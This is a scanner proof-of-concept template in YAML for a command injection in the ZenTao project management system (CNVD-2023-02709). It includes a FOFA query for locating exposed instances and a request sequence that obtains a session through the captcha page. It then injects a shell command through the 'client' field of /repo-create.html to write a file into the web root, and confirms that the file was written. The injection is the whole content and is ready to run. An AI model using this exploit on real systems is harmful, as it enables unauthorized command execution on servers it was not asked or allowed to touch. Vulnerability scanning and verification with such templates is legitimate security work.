id: poc-yaml-zentao-misc-captcha-user-html-command-injection
info:
  name: 禅道项目管理系统 misc-captcha-user.html 命令注入漏洞(CNVD-2023-02709)
  severity: critical
  tags:
  - CNVD-2023-02709
  - 两高一弱
  finger: 禅道项目管理系统
  fofa: title="用户登录 - 禅道"
variables:
  t1: random_str(4)
  t2: md5(t1)
requests:
- method: GET
  path: /misc-captcha-user.html
  headers:
    Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default
  expression: status_code == 200
- method: POST
  path: /repo-create.html
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default
  data: SCM=Subversion&client=echo {{.t2}}// > ../../www/{{.t1}}.txt --
  expression: status_code == 200
- method: GET
  path: /{{.t1}}.txt
  headers:
    Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default
  expression: status_code == 200 && contains(body,t2)
transport: http
